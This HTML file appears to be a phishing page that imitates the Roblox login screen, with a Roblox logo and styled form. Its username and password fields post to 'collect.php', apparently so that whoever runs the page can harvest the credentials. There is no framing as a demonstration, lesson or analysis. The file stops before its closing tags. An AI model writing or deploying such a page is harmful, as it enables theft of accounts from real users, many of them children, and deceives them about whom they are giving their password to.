<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login</title>
    <style>
        body { font-family: Arial; background-color: #f0f0f0; text-align: center; padding: 50px; }
        .login-box { background-color: white; max-width: 400px; margin: 0 auto; padding: 20px; border-radius: 10px; }
        input { width: 90%; padding: 10px; margin: 10px 0; }
        button { background-color: #00bfff; color: white; border: none; padding: 10px 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://images.roblox.com/logo.png" width="200">
        <h2>Login</h2>
        <form action="collect.php" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
